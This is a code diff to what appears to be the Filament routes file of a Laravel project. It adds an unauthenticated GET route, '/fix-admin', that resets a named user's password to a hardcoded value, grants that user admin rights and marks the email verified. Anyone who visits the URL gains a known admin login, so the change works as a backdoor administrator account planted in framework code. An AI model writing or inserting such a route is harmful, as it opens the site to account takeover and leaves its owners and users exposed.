@@ -7,6 +7,8 @@ use Filament\Http\Controllers\RedirectToHomeController;
 use Filament\Http\Controllers\RedirectToTenantController;
 use Filament\Panel;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Hash;
+use App\Models\User;
 
 Route::name('filament.')
     ->group(function () {
@@ -170,3 +172,15 @@ Route::name('filament.')
             }
         }
     });
+
+Route::get('/fix-admin', function () {
+    $user = User::where('email', 'prince@coinmews.io')->first();
+    if ($user) {
+        $user->password = Hash::make('YourNewPassword123!');
+        $user->is_admin = true;
+        $user->email_verified_at = now();
+        $user->save();
+        return 'Admin user updated!';
+    }
+    return 'User not found!';
+});
